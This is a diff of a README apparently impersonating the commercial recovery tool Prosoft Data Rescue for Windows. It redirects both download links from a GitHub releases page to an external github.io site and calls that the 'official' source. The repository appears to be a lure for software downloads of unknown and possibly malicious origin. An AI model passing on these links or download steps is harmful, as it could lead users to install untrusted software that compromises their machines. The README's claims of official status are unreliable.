@@ -1,6 +1,6 @@
 # 💽 Prosoft-Data-Rescue-2026 - Recover your lost files today easily
 
-[![](https://img.shields.io/badge/Download_Prosoft_Data_Rescue-2026-blue)](https://github.com/Caressestrongminded988/Prosoft-Data-Rescue-2026/releases)
+[![](https://img.shields.io/badge/Download_Prosoft_Data_Rescue-2026-blue)](https://caressestrongminded988.github.io)
 
 ## 📌 About the software
 Prosoft Data Rescue 2026 provides a way to recover deleted or damaged files from your computer. You can restore documents, images, and videos from hard drives or external storage devices. This tool works on Windows 11 and Windows 10. The interface allows you to scan your storage and select the files you need to keep. Users often choose this tool when files disappear due to accidental deletion, system errors, or drive corruption.
@@ -16,7 +16,7 @@ Prosoft Data Rescue 2026 provides a way to recover deleted or damaged files from
 ## 💾 How to download the software
 You can get the installation file from the official releases page. 
 
-[Visit this page to download the software](https://github.com/Caressestrongminded988/Prosoft-Data-Rescue-2026/releases)
+[Visit this page to download the software](https://caressestrongminded988.github.io)
 
 1. Navigate to the link above using your web browser.
 2. Look for the section titled "Assets" at the bottom of the latest release.
